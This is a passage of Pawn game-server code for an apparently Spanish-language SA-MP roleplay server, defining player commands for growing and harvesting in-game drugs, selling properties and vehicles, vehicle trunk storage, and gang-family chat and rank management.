					GetPlayerPos(playerid, semillas[f][sPosicion][0], semillas[f][sPosicion][1], semillas[f][sPosicion][2]);
					format(string, sizeof(string), "{ffff00}Tipo{ffffff}: %s\n{ffff00}Tiempo de Cosecha{ffffff}: %s\n{ffff00}Dueño{ffffff}: %s", semillas[f][sNameTipo], ObtenerTiempoRestante(semillas[f][sTime]), semillas[f][sDueno]);
					semillas[f][sLabel] = CreateDynamic3DTextLabel(string, 0xFFFFFF44, semillas[f][sPosicion][0], semillas[f][sPosicion][1], semillas[f][sPosicion][2]+0.25, 2.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 2.0);
					semillas[f][sObjeto] = CreateDynamicObject(3409, semillas[f][sPosicion][0], semillas[f][sPosicion][1], semillas[f][sPosicion][2]-1.2, 0, 0, 0);
					break;
				}
			}
		}else Mensaje(playerid, COLOR_GRIS1, "No posees este tipo de semilla.");
	}
	else if(!strcmp("marihuana", ndroga))
	{
		if(cuenta[playerid][cSemillas][4] > 0)
		{
			cuenta[playerid][cSemillas][4]--;
			for(new f=0;f<MAX_SEMILLAS_SEMBRADAS;f++)
			{
				if(!semillas[f][sSlot])
				{
					semillas[f][sSlot] = true;
					semillas[f][sTipo] = 5;
					
					//ZZCASH
					switch(cuenta[playerid][cDonador])
					{
						case 1:		semillas[f][sTime] = gettime() + 3000;
						case 2:		semillas[f][sTime] = gettime() + 2400;
						case 3:		semillas[f][sTime] = gettime() + 1800;
						case 4:		semillas[f][sTime] = gettime() + 1200;
						default:	semillas[f][sTime] = gettime() + 3600;
					}

					semillas[f][sDueno] = Nombre(playerid);
					format(semillas[f][sNameTipo], 24, "Marihuana");

					GetPlayerPos(playerid, semillas[f][sPosicion][0], semillas[f][sPosicion][1], semillas[f][sPosicion][2]);
					format(string, sizeof(string), "{ffff00}Tipo{ffffff}: %s\n{ffff00}Tiempo de Cosecha{ffffff}: %s\n{ffff00}Dueño{ffffff}: %s", semillas[f][sNameTipo], ObtenerTiempoRestante(semillas[f][sTime]), semillas[f][sDueno]);
					semillas[f][sLabel] = CreateDynamic3DTextLabel(string, 0xFFFFFF44, semillas[f][sPosicion][0], semillas[f][sPosicion][1], semillas[f][sPosicion][2]+0.25, 2.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 2.0);
					semillas[f][sObjeto] = CreateDynamicObject(3409, semillas[f][sPosicion][0], semillas[f][sPosicion][1], semillas[f][sPosicion][2]-1.2, 0, 0, 0);
					break;
				}
			}
		}else Mensaje(playerid, COLOR_GRIS1, "No posees este tipo de semilla.");
	}else Mensaje(playerid, -1, "Utiliza: /sembrarsemilla [speed - ectasy - ritalin - heroina - marihuana]");
	return 1;
}
COMMAND:cosecharsemilla(playerid, params[])
{
	for(new f=0;f<MAX_SEMILLAS_SEMBRADAS;f++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 1, semillas[f][sPosicion][0], semillas[f][sPosicion][1], semillas[f][sPosicion][2])){
			if(semillas[f][sSlot] && gettime() > semillas[f][sTime])
			{
				new string[128], dGramos = 3 + random(2);
				switch(semillas[f][sTipo])
				{
					case 1:
					{
						cuenta[playerid][cSpeed] += dGramos;
						format(string, sizeof(string), "Usted ha cosechado %d Gramos de Speed", dGramos);
						Mensaje(playerid, COLOR_BLANCO, string);
					}
					case 2:
					{
						cuenta[playerid][cExtasis] += dGramos;
						format(string, sizeof(string), "Usted ha cosechado %d Gramos de Ectasy", dGramos);
						Mensaje(playerid, COLOR_BLANCO, string);
					}
					case 3:
					{
						cuenta[playerid][cRitalin] += dGramos;
						format(string, sizeof(string), "Usted ha cosechado %d Gramos de Ritalin", dGramos);
						Mensaje(playerid, COLOR_BLANCO, string);
					}
					case 4:
					{
						cuenta[playerid][cHeroina] += dGramos;
						format(string, sizeof(string), "Usted ha cosechado %d Gramos de Heroina", dGramos);
						Mensaje(playerid, COLOR_BLANCO, string);
					}
					case 5:
					{
						cuenta[playerid][cMarihuana] += dGramos;
						format(string, sizeof(string), "Usted ha cosechado %d Gramos de Marihuana", dGramos);
						Mensaje(playerid, COLOR_BLANCO, string);
					}
				}

				DestroyDynamic3DTextLabel(semillas[f][sLabel]);
				DestroyDynamicObject(semillas[f][sObjeto]);
				format(semillas[f][sDueno], 24, "SinDueno");
				semillas[f][sSlot] = false;
				break;
			}else return Mensaje(playerid, COLOR_GRIS3, "Esta planta aun no esta lista.");
		}
	}
	return 1;
}
COMMAND:drogas(playerid, params[]){
	new string[128];
	Mensaje(playerid, COLOR_BLANCO, "Drogas Encima:");
	format(string, sizeof(string), "Drogas: %d - Speed: %d - Extasis: %d - Ritalin: %d - Heroína: %d - Marihuana: %d", cuenta[playerid][cDrogas], cuenta[playerid][cSpeed], cuenta[playerid][cExtasis], cuenta[playerid][cRitalin], cuenta[playerid][cHeroina], cuenta[playerid][cMarihuana]);
	Mensaje(playerid, COLOR_AMARILLO2, string);
	Mensaje(playerid, COLOR_BLANCO, "Semillas Encima:");
	format(string, sizeof(string), "Speed: %d - Extasis: %d - Ritalin: %d - Heroína: %d - Marihuana: %d", cuenta[playerid][cSemillas][0], cuenta[playerid][cSemillas][1], cuenta[playerid][cSemillas][2], cuenta[playerid][cSemillas][3], cuenta[playerid][cSemillas][4]);
	Mensaje(playerid, COLOR_AMARILLO2, string);
	return 1;
}
COMMAND:venderneg(playerid, params[])
{
	new neg, idneg, precio, jugador;
	if(sscanf(params, "udd", jugador, neg, precio))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /venderneg [Usuario] [slot 1 - 2] [Precio $]");
	if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_GRIS2, "El usuario no esta conectado.");
	if(!dDistanciaJugador(8.0, playerid, jugador))return Mensaje(playerid, COLOR_GRIS2, "Este usuarios esta muy lejos de usted.");
	if(precio < 1000 || precio > 5000000)return Mensaje(playerid, COLOR_GRIS2, "Venta minima 1000, venta maxima 5.000.000");
	if(obtenerDinero(jugador) <= precio)return Mensaje(playerid, COLOR_GRIS2, "El jugador no tiene fondos suficientes.");
	if(booleano[Facturing]{jugador})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Este jugador está en otra tarea, espera.");
	
	idneg = (neg == 1) ? (cuenta[playerid][cNegocio]):(cuenta[playerid][cNegocio2]);
	if(idneg == 9999)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene un negocio.");
	
	peticionIDItem[jugador] = idneg;
	peticionIDofertante[jugador] = playerid;
	peticionPrecio[jugador] = precio;
	peticiones[jugador] = 7;
	booleano[Facturing]{jugador} = true;
	peticionSlotItem[jugador] = neg;
	
	new string[128];
	format(string, sizeof(string), "Ofreciste a %s tu negocio por %d$", PlayerName(jugador), peticionPrecio[jugador]);
	Mensaje(playerid, COLOR_BLANCO, string);
	format(string, sizeof(string), "\t\t-- Compra de Negocio --\t\t\n\t* %s te ofrece su %s a %d$, ¿acepta?", PlayerName(playerid), negocio[idneg][bName], peticionPrecio[jugador]);
	EnviarPeticion(jugador, string);
	return 1;
}
COMMAND:vendercas(playerid, params[])
{
	new cas, idcas, precio, jugador;
	if(sscanf(params, "udd", jugador, cas, precio))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /vendercas [Usuario] [slot 1 - 2] [Precio $]");
	if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_GRIS2, "El usuario no esta conectado.");
	if(!dDistanciaJugador(8.0, playerid, jugador))return Mensaje(playerid, COLOR_GRIS2, "Este usuarios esta muy lejos de usted.");
	if(precio < 1000 || precio > 5000000)return Mensaje(playerid, COLOR_GRIS2, "Venta minima 1000, venta maxima 5.000.000");
	if(obtenerDinero(jugador) <= precio)return Mensaje(playerid, COLOR_GRIS2, "El jugador no tiene fondos suficientes.");
	if(booleano[Facturing]{jugador})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Este jugador está en otra tarea, espera.");
	
	idcas = (cas == 1) ? (cuenta[playerid][cCasa]):(cuenta[playerid][cCasa2]);
	if(idcas == 9999)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene una propiedad.");
	
	peticionIDItem[jugador] = idcas;
	peticionIDofertante[jugador] = playerid;
	peticionPrecio[jugador] = precio;
	peticiones[jugador] = 8;
	booleano[Facturing]{jugador} = true;
	peticionSlotItem[jugador] = cas;
	
	new string[128];
	format(string, sizeof(string), "Ofreciste a %s tu propiedad por %d$", PlayerName(jugador), peticionPrecio[jugador]);
	Mensaje(playerid, COLOR_BLANCO, string);
	format(string, sizeof(string), "\t\t-- Compra de Propiedad --\t\t\n\t* %s te ofrece su %s a %d$, ¿acepta?", PlayerName(playerid), casa[idcas][hNombre], peticionPrecio[jugador]);
	EnviarPeticion(jugador, string);
	return 1;
}
COMMAND:venderveh(playerid, params[])
{
	new user, item, price;
	if(sscanf(params, "udd", user, item, price))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /venderveh [Jugador] [Slot 1 - 4] [Precio]");
	if(!IsPlayerConnected(user))return Mensaje(playerid, COLOR_GRIS2, "El jugador no esta conectado.");
	if(!dDistanciaJugador(8.0, playerid, user))return Mensaje(playerid, COLOR_GRIS2, "Jugador muy lejos.");
	if(price < 1000 || price > 2000000)return Mensaje(playerid, COLOR_GRIS2, "Venta minima 1000, venta maxima 2.000.000");
	if(obtenerDinero(user) <= price)return Mensaje(playerid, COLOR_GRIS2, "El jugador no tiene fondos suficientes.");
	if(booleano[Facturing]{user})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Este jugador está en otra tarea, espera.");

	switch(item)
	{
		case 1:
		{
			if(cuenta[playerid][cCoche])
			{
				peticionIDItem[user] = cuenta[playerid][cCoche];
				peticionIDofertante[user] = playerid;
				peticionPrecio[user] = price;
				peticiones[user] = 3;
				booleano[Facturing]{user} = true;
				peticionSlotItem[user] = item;
				new string[128];
				format(string, sizeof(string), "Ofreciste a %s tu vehículo por %d$", PlayerName(user), peticionPrecio[user]);
				Mensaje(playerid, COLOR_BLANCO, string);
				format(string, sizeof(string), "\t\t-- Compra de Vehículo --\t\t\n\t* %s te ofrece su %s a %d$, ¿acepta?", PlayerName(playerid), autos[cuenta[playerid][cCoche]][cName], peticionPrecio[user]);
				EnviarPeticion(user, string);
			}
		}
		case 2:
		{
			if(cuenta[playerid][cCoche2])
			{
				peticionIDItem[user] = cuenta[playerid][cCoche2];
				peticionIDofertante[user] = playerid;
				peticionPrecio[user] = price;
				peticiones[user] = 3;
				booleano[Facturing]{user} = true;
				peticionSlotItem[user] = item;
				new string[128];
				format(string, sizeof(string), "Ofreciste a %s tu vehículo por %d$", PlayerName(user), peticionPrecio[user]);
				Mensaje(playerid, COLOR_BLANCO, string);
				format(string, sizeof(string), "\t\t-- Compra de Vehículo --\t\t\n\t* %s te ofrece su %s a %d$, ¿acepta?", PlayerName(playerid), autos[cuenta[playerid][cCoche2]][cName], peticionPrecio[user]);
				EnviarPeticion(user, string);
			}
		}
		case 3:
		{
			if(cuenta[playerid][cCoche3])
			{
				peticionIDItem[user] = cuenta[playerid][cCoche3];
				peticionIDofertante[user] = playerid;
				peticionPrecio[user] = price;
				peticiones[user] = 3;
				booleano[Facturing]{user} = true;
				peticionSlotItem[user] = item;
				new string[128];
				format(string, sizeof(string), "Ofreciste a %s tu vehículo por %d$", PlayerName(user), peticionPrecio[user]);
				Mensaje(playerid, COLOR_BLANCO, string);
				format(string, sizeof(string), "\t\t-- Compra de Vehículo --\t\t\n\t* %s te ofrece su %s a %d$, ¿acepta?", PlayerName(playerid), autos[cuenta[playerid][cCoche3]][cName], peticionPrecio[user]);
				EnviarPeticion(user, string);
			}
		}
		case 4:
		{
			if(cuenta[playerid][cCoche4])
			{
				peticionIDItem[user] = cuenta[playerid][cCoche4];
				peticionIDofertante[user] = playerid;
				peticionPrecio[user] = price;
				peticiones[user] = 3;
				booleano[Facturing]{user} = true;
				peticionSlotItem[user] = item;
				new string[128];
				format(string, sizeof(string), "Ofreciste a %s tu vehículo por %d$", PlayerName(user), peticionPrecio[user]);
				Mensaje(playerid, COLOR_BLANCO, string);
				format(string, sizeof(string), "\t\t-- Compra de Vehículo --\t\t\n\t* %s te ofrece su %s a %d$, ¿acepta?", PlayerName(playerid), autos[cuenta[playerid][cCoche4]][cName], peticionPrecio[user]);
				EnviarPeticion(user, string);
			}
		}
		default: Mensaje(playerid, COLOR_GRIS2, "Error de Slot del 1 al 5.");
	}
	return 1;
}
COMMAND:vmaletero(playerid, params[])
{
	verificarArmaHack(playerid);
	
	new opcion[24], counter, result, string[126], slotid;
	if(sscanf(params, "s[24]D(0)", opcion, slotid))
	{
		Mensaje(playerid, COLOR_GRIS2, "Utiliza: /vmaletero [Opcion]");
		Mensaje(playerid, COLOR_GRIS2, "Opcion: ver - abrir - cerrar - garma - sarma - gchaleco - schaleco - gdroga - sdroga");
		return 1;
	}
	if(Team_LSPD(playerid) || Team_FBI(playerid))
	{
		Mensaje(playerid, COLOR_ROJO, "No puedes usar este comando debido a tu faccion!");
		return 1;
	}

	for(new i=0;i<MAX_VEHICLES;i++)
	{
		new dist = CheckPlayerDistanceToVehicle(4.0, playerid, i);
		if(dist)
		{
			result = i;
			counter++;
			break;
		}
	}
	if(!counter)return Mensaje(playerid, COLOR_BLANCO, "Ningún vehículo cerca de usted.");
	if(NoPuedeTener(result))return Mensaje(playerid, COLOR_ROJO, "Este vehículo no tiene maletero o no puede.");

	new engine, lights, alarm, doors, bonnet, boot, objective;
	GetVehicleParamsEx(result, engine, lights, alarm, doors, bonnet, boot, objective);
	if(!strcmp(opcion, "ver"))
	{
		if(!maletero[result][mbloqueo])return Mensaje(playerid, COLOR_ROJO, "Este maletero esta cerrado.");
		Mensaje(playerid, COLOR_BLANCO, "Maletero del Vehiculo:");

		for(new i=0;i<8;i++)
		{
			format(string, sizeof(string), "Arma: {C0C0C0}%s con 50 municiones.", NombreArma(maletero[result][marma][i]));
			Mensaje(playerid, COLOR_BLANCO, string);
		}

		format(string, sizeof(string), "Chaleco: {C0C0C0}%s", (!maletero[result][mchaleco]) ? ("No"):("Si"));
		Mensaje(playerid, COLOR_BLANCO, string);

		format(string, sizeof(string), "Droga: {C0C0C0}%d gramos de Speed", maletero[result][mdrogas][0]);
		Mensaje(playerid, COLOR_BLANCO, string);
		format(string, sizeof(string), "Droga: {C0C0C0}%d gramos de Extasis", maletero[result][mdrogas][1]);
		Mensaje(playerid, COLOR_BLANCO, string);
		format(string, sizeof(string), "Droga: {C0C0C0}%d gramos de Ritalin", maletero[result][mdrogas][2]);
		Mensaje(playerid, COLOR_BLANCO, string);
		format(string, sizeof(string), "Droga: {C0C0C0}%d gramos de Heroina", maletero[result][mdrogas][3]);
		Mensaje(playerid, COLOR_BLANCO, string);
		format(string, sizeof(string), "Droga: {C0C0C0}%d gramos de Marihuana", maletero[result][mdrogas][4]);
		Mensaje(playerid, COLOR_BLANCO, string);

		ActualizarMaletas(result);
	}
	else if(!strcmp(opcion, "abrir"))
	{
		if(!LlaveVehicular(playerid, result))return Mensaje(playerid, COLOR_ROJO, "Usted no tiene llave de este auto.");
		if(!maletero[result][mbloqueo])
		{
			maletero[result][mbloqueo] = true;
			SetVehicleParamsEx(result, engine, lights, alarm, doors, bonnet, 1, objective);
			Mensaje(playerid, COLOR_BLANCO, "Maleta Abierta.");
		}
	}
	else if(!strcmp(opcion, "cerrar"))
	{
		if(!LlaveVehicular(playerid, result))return Mensaje(playerid, COLOR_ROJO, "Usted no tiene llave de este auto.");
		if(maletero[result][mbloqueo])
		{
			maletero[result][mbloqueo] = false;
			SetVehicleParamsEx(result, engine, lights, alarm, doors, bonnet, 0, objective);
			Mensaje(playerid, COLOR_BLANCO, "Maleta Cerrada.");
		}
	}
	else if(!strcmp(opcion, "garma"))
	{
		if(slotid < 1 || slotid > 8)return Mensaje(playerid, COLOR_ROJO, "Utiliza: /maletero garma (slot 1 - 8)");
		if(!maletero[result][mbloqueo])return Mensaje(playerid, COLOR_ROJO, "Este maletero esta cerrado.");
		if(!GetPlayerWeapon(playerid))return Mensaje(playerid, COLOR_ROJO, "Usted no tiene un arma.");
		if(GetPlayerAmmo(playerid) < 50)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente municion, debe tener 50.");
		if(maletero[result][marma][slotid - 1])return Mensaje(playerid, COLOR_ROJO, "Este maletero ya tiene un arma.");

		maletero[result][marma][slotid - 1] = GetPlayerWeapon(playerid);
		darArma(playerid, maletero[result][marma][slotid - 1], -50);
		
		if(TieneMaleta(result))
		{
			DestroyDynamicObject(MaleteroObjetos[result][slotid - 1]);
			MaleteroObjetos[result][slotid - 1] = CreateDynamicObject(GunObjects[maletero[result][marma][slotid - 1]][0], 0, 0, -1000, 0, 0, 0);
			switch(slotid - 1)
			{
				case 0: AttachDynamicObjectToVehicle(MaleteroObjetos[result][0], result, 0.300000, -1.950000, 0.075000, 94.499977, 43.200004, -221.399856);
				case 1: AttachDynamicObjectToVehicle(MaleteroObjetos[result][1], result, 0.449999, -2.100000, 0.075000, 94.499977, 43.200004, -221.399856);
				case 2: AttachDynamicObjectToVehicle(MaleteroObjetos[result][2], result, 0.000000, -2.100000, 0.075000, 94.499977, 43.200004, -221.399856);
				case 3: AttachDynamicObjectToVehicle(MaleteroObjetos[result][3], result, -0.075000, -2.325000, 0.075000, 94.499977, 43.200004, -221.399856);
				case 4: AttachDynamicObjectToVehicle(MaleteroObjetos[result][4], result, 0.524999, -2.325000, 0.075000, 94.499977, 43.200004, -221.399856);
				case 5: AttachDynamicObjectToVehicle(MaleteroObjetos[result][5], result, 0.375000, -2.325000, 0.150000, 94.499977, 43.200004, -221.399856);
				case 6: AttachDynamicObjectToVehicle(MaleteroObjetos[result][6], result, -0.075000, -2.325000, 0.150000, 94.499977, 43.200004, -221.399856);
				case 7: AttachDynamicObjectToVehicle(MaleteroObjetos[result][7], result, 0.150000, -2.100000, 0.150000, 94.499977, 43.200004, -221.399856);
			}		
		}
		format(string, sizeof(string), "Usted acaba de guardar un %s con 50 municiones.", NombreArma(maletero[result][marma][slotid - 1]));
		Mensaje(playerid, COLOR_BLANCO, string);
		ActualizarMaletas(result);
	}
	else if(!strcmp(opcion, "sarma"))
	{
		if(slotid < 1 || slotid > 8)return Mensaje(playerid, COLOR_ROJO, "Utiliza: /maletero garma (slot 1 - 8)");
		if(!maletero[result][mbloqueo])return Mensaje(playerid, COLOR_ROJO, "Este maletero esta cerrado.");
		if(!maletero[result][marma][slotid - 1])return Mensaje(playerid, COLOR_ROJO, "Este maletero no tiene un arma.");
		darArma(playerid, maletero[result][marma][slotid - 1], 50);
		
		format(string, sizeof(string), "Usted acaba de retirar un %s con 50 municiones.", NombreArma(maletero[result][marma][slotid - 1]));
		Mensaje(playerid, COLOR_BLANCO, string);
		if(TieneMaleta(result))
		{
			DestroyDynamicObject(MaleteroObjetos[result][slotid - 1]);
		}
		
		maletero[result][marma][slotid - 1] = 0;
		ActualizarMaletas(result);
	}
	else if(!strcmp(opcion, "gchaleco"))
	{
		if(!maletero[result][mbloqueo])return Mensaje(playerid, COLOR_ROJO, "Este maletero esta cerrado.");
		if(maletero[result][mchaleco])return Mensaje(playerid, COLOR_ROJO, "Este maletero tiene un chaleco.");

		new Float:fChaleco;
		GetPlayerArmour(playerid, fChaleco);
		if(fChaleco != 100.0)return Mensaje(playerid, COLOR_BLANCO, "Usted no tiene un chaleco.");

		maletero[result][mchaleco] = 1;
		Mensaje(playerid, COLOR_BLANCO, "Usted acaba de guardar un chaleco.");
		ActualizarMaletas(result);
	}
	else if(!strcmp(opcion, "schaleco"))
	{
		if(!maletero[result][mbloqueo])return Mensaje(playerid, COLOR_ROJO, "Este maletero esta cerrado.");
		if(!maletero[result][mchaleco])return Mensaje(playerid, COLOR_ROJO, "Este maletero no tiene un chaleco.");

		darArmadura(playerid, 100);
		maletero[result][mchaleco] = 0;
		Mensaje(playerid, COLOR_BLANCO, "Usted acaba de retirar un chaleco.");
		ActualizarMaletas(result);
	}
	else if(!strcmp(opcion, "gdroga"))
	{
		if(slotid < 1 || slotid > 5)return Mensaje(playerid, COLOR_ROJO, "Utiliza: /maletero gdroga [1(Speed) - 2(Extasis) - 3(Ritalin) - 4(Heroina) - 5(Marihuana)]");
		if(!maletero[result][mbloqueo])return Mensaje(playerid, COLOR_ROJO, "Este maletero esta cerrado.");
		switch(slotid)
		{
			case 1:
			{
				maletero[result][mdrogas][0] += cuenta[playerid][cSpeed];
				cuenta[playerid][cSpeed] = 0;

				format(string, sizeof(string), "Acabas de guardar %d gramos de Speed.", maletero[result][mdrogas][0]);
				Mensaje(playerid, COLOR_BLANCO, string);
			}
			case 2:
			{
				maletero[result][mdrogas][1] += cuenta[playerid][cExtasis];
				cuenta[playerid][cExtasis] = 0;

				format(string, sizeof(string), "Acabas de guardar %d gramos de Extasis.", maletero[result][mdrogas][1]);
				Mensaje(playerid, COLOR_BLANCO, string);
			}
			case 3:
			{
				maletero[result][mdrogas][2] += cuenta[playerid][cRitalin];
				cuenta[playerid][cRitalin] = 0;

				format(string, sizeof(string), "Acabas de guardar %d gramos de Ritalin.", maletero[result][mdrogas][2]);
				Mensaje(playerid, COLOR_BLANCO, string);
			}
			case 4:
			{
				maletero[result][mdrogas][3] += cuenta[playerid][cHeroina];
				cuenta[playerid][cHeroina] = 0;

				format(string, sizeof(string), "Acabas de guardar %d gramos de Heroina.", maletero[result][mdrogas][3]);
				Mensaje(playerid, COLOR_BLANCO, string);
			}
			case 5:
			{
				maletero[result][mdrogas][4] += cuenta[playerid][cMarihuana];
				cuenta[playerid][cMarihuana] = 0;

				format(string, sizeof(string), "Acabas de guardar %d gramos de Marihuana.", maletero[result][mdrogas][4]);
				Mensaje(playerid, COLOR_BLANCO, string);
			}
		}
		ActualizarMaletas(result);
	}
	else if(!strcmp(opcion, "sdroga"))
	{
		if(slotid < 1 || slotid > 5)return Mensaje(playerid, COLOR_ROJO, "Utiliza: /maletero sdroga [1(Speed) - 2(Extasis) - 3(Ritalin) - 4(Heroina) - 5(Marihuana)]");
		if(!maletero[result][mbloqueo])return Mensaje(playerid, COLOR_ROJO, "Este maletero esta cerrado.");
		switch(slotid)
		{
			case 1:
			{
				cuenta[playerid][cSpeed] += maletero[result][mdrogas][0];

				format(string, sizeof(string), "Acabas de retirar %d gramos de Speed.", maletero[result][mdrogas][0]);
				Mensaje(playerid, COLOR_BLANCO, string);

				maletero[result][mdrogas][0] = 0;
			}
			case 2:
			{
				cuenta[playerid][cExtasis] += maletero[result][mdrogas][1];

				format(string, sizeof(string), "Acabas de retirar %d gramos de Extasis.", maletero[result][mdrogas][1]);
				Mensaje(playerid, COLOR_BLANCO, string);

				maletero[result][mdrogas][1] = 0;
			}
			case 3:
			{
				cuenta[playerid][cRitalin] += maletero[result][mdrogas][2];

				format(string, sizeof(string), "Acabas de retirar %d gramos de Ritalin.", maletero[result][mdrogas][2]);
				Mensaje(playerid, COLOR_BLANCO, string);

				maletero[result][mdrogas][2] = 0;
			}
			case 4:
			{
				cuenta[playerid][cHeroina] += maletero[result][mdrogas][3];

				format(string, sizeof(string), "Acabas de retirar %d gramos de Heroina.", maletero[result][mdrogas][3]);
				Mensaje(playerid, COLOR_BLANCO, string);

				maletero[result][mdrogas][3] = 0;
			}
			case 5:
			{
				cuenta[playerid][cMarihuana] += maletero[result][mdrogas][4];

				format(string, sizeof(string), "Acabas de retirar %d gramos de Marihuana.", maletero[result][mdrogas][4]);
				Mensaje(playerid, COLOR_BLANCO, string);

				maletero[result][mdrogas][4] = 0;
			}
		}
		ActualizarMaletas(result);
	}
	else return Mensaje(playerid, COLOR_GRIS2, "Opcion: ver - abrir - cerrar - garma - sarma - gchaleco - schaleco - gdroga - sdroga");
	return 1;
}
COMMAND:familias(playerid, params[])
{
	new lider[24], Cache:r, string[128];
	for(new i=1;i<MAX_FAMILIAS;i++)
	{
		if(familias[i][fOcupado])
		{
			mysql_format(servidor[mysqlControl], string, sizeof(string), "SELECT nombre, fam, famr FROM zz_usuarios WHERE fam=%d", i);
			r = mysql_query(servidor[mysqlControl], string, true);
			for(new k=0;k<cache_get_row_count();k++)
			{
				if(cache_get_row_int(k, 1, servidor[mysqlControl]) == i && cache_get_row_int(k, 2, servidor[mysqlControl]) == 6)
				{
					cache_get_row(k, 0, lider, servidor[mysqlControl], sizeof(lider));
					break;
				}
			}
			format(string, sizeof(string), "{4169E1}Familia{FFFFFF}: %s - {FFA500}Lider{FFFFFF}: %s - {FFA500}Miembros{FFFFFF}: %d", familias[i][fNombre], lider, cache_get_row_count());
			Mensaje(playerid, COLOR_BLANCO, string);
			cache_delete(r);
		}
	}
	return 1;
}
COMMAND:fcuartel(playerid, params[])
{
	if(!cuenta[playerid][cFamilia])return Mensaje(playerid, COLOR_ROJO, "Este comando es solo para familiares.");
	if(cuenta[playerid][cFamiliaRango] != 6)return Mensaje(playerid, COLOR_ROJO, "Usted no es el lider de esta familia.");
	new facc = cuenta[playerid][cFamilia], Float:xpos[3], string[128];
	GetPlayerPos(playerid, xpos[0], xpos[1], xpos[2]);
	format(string, sizeof(string), "{B22222}Prodiedad de\n{FFFFFF}%s", familias[facc][fNombre]);
	DestroyDynamic3DTextLabel(familias[facc][fHqFam3d]);
	DestroyDynamicPickup(familias[facc][fHqFampi]);
	familias[facc][fHqFam3d] = CreateDynamic3DTextLabel(string, -1, xpos[0], xpos[1], xpos[2]+0.75, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1);
	familias[facc][fHqFampi] = CreateDynamicPickup(1314, 1, xpos[0], xpos[1], xpos[2], -1);
	Mensaje(playerid, COLOR_BLANCO, "Ahora este territorio le pertenece a su familia.");
	return 1;
}
COMMAND:fr(playerid, params[])
{
	if(estaSilenciado(playerid))return 1;
	new string[256], texto[128], facc = cuenta[playerid][cFamilia];
	if(!cuenta[playerid][cFamilia])return Mensaje(playerid, COLOR_ROJO, "Este comando es solo para familiares.");
	if(sscanf(params, "s[128]", texto))return Mensaje(playerid, COLOR_GRIS1, "/fr (Mensaje)");
	palabrasProhibidas(texto);
	
	format(string, sizeof(string), "[Radio]%s - %s: %s", ObtenerNombreRango(facc, cuenta[playerid][cFamiliaRango]), PlayerName(playerid), texto);
	for(new i=0, t=GetMaxPlayers();i<t;i++)
	{
		if(cuenta[i][cFamilia] == facc)
		{
			Mensaje(i, TEAM_RADIO_COLOR, string);
		}
	}
	format(string, sizeof(string), "*(Radio)%s: %s", PlayerName(playerid), texto);
	ProxDetector(10.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
	return 1;
}
COMMAND:fam(playerid, params[])
{
	if(estaSilenciado(playerid))return 1;
	new string[256], texto[128], facc = cuenta[playerid][cFamilia];
	if(!cuenta[playerid][cFamilia])return Mensaje(playerid, COLOR_ROJO, "Este comando es solo para familiares.");
	if(!familias[facc][fChat])return Mensaje(playerid, COLOR_ROJO, "El chat /fam esta desabilitado.");
	if(sscanf(params, "s[128]", texto))return Mensaje(playerid, COLOR_GRIS1, "/fam (Mensaje)");
	palabrasProhibidas(texto);

	format(string, sizeof(string), "{99CFEB}[OOC]%s %s: %s", ObtenerNombreRango(facc, cuenta[playerid][cFamiliaRango]), PlayerName(playerid), texto);
	for(new i=0, t=GetMaxPlayers();i<t;i++)
	{
		if(cuenta[i][cFamilia] == facc)
		{
			Mensaje(i, COLOR_BLANCO, string);
		}
	}
	return 1;
}
COMMAND:ftogfac(playerid, params[]){
	if(!cuenta[playerid][cFamilia])return Mensaje(playerid, COLOR_ROJO, "Este comando es solo para familiares.");
	if(cuenta[playerid][cFamiliaRango] != 6)return Mensaje(playerid, COLOR_ROJO, "Usted no es el lider de esta familia.");
	new facc = cuenta[playerid][cFamilia];
	if(!familias[facc][fChat]){
		familias[facc][fChat] = true;
		Mensaje(playerid, COLOR_BLANCO, "Usted acaba de habilitar el /fam.");
	}else{
		familias[facc][fChat] = false;
		Mensaje(playerid, COLOR_BLANCO, "Usted acaba de desabilitar el /fam.");
	}
	return 1;
}
COMMAND:frango(playerid, params[]){
	new string[128], faccid, player, rango;
	if(!cuenta[playerid][cFamilia])return Mensaje(playerid, COLOR_ROJO, "Este comando es solo para familiares.");
	if(sscanf(params, "ud", player, rango))return Mensaje(playerid, COLOR_GRIS1, "Utiliza: /frango (Jugador/ID) (Rango)");
	faccid = cuenta[playerid][cFamilia];

	if(dDistanciaJugador(8.0, playerid, player)){
		if(IsPlayerConnected(player)){
			if(cuenta[playerid][cFamiliaRango] == 6){
				if(faccid == cuenta[player][cFamilia]){
					switch(rango){
						case 1 .. 6:{
							format(string, sizeof(string), "%s le otorgaste rango %s(%d) de la familia.", PlayerName(player), ObtenerNombreRango(faccid, rango), rango);
							Mensaje(playerid, COLOR_VERDE, string);
							format(string, sizeof(string), "%s te otorgo rango %s(%d) de la familia.", PlayerName(playerid), ObtenerNombreRango(faccid, rango), rango);
							Mensaje(player, COLOR_VERDE, string);
							cuenta[player][cFamiliaRango] = rango;
							
							new Consulta[126];
							mysql_format(servidor[mysqlControl], Consulta, sizeof(Consulta), "UPDATE zz_usuarios SET fam=%d, famr=%d WHERE id = %d;", cuenta[player][cFamilia], cuenta[player][cFamiliaRango], cuenta[player][cUnico]);
							mysql_query(servidor[mysqlControl], Consulta, false);
						}
						default: Mensaje(playerid, COLOR_ROJO, "Este rango no existe.");
					}
				}else Mensaje(playerid, COLOR_ROJO, "Este miembro no pertenece a su familia.");
			}else Mensaje(playerid, COLOR_ROJO, "Usted no es el lider de esta familia.");
		}else Mensaje(playerid, COLOR_ROJO, "Este jugador no esta conectado.");
	}else Mensaje(playerid, COLOR_ROJO, "Este jugador esta muy lejos.");
	return 1;
}
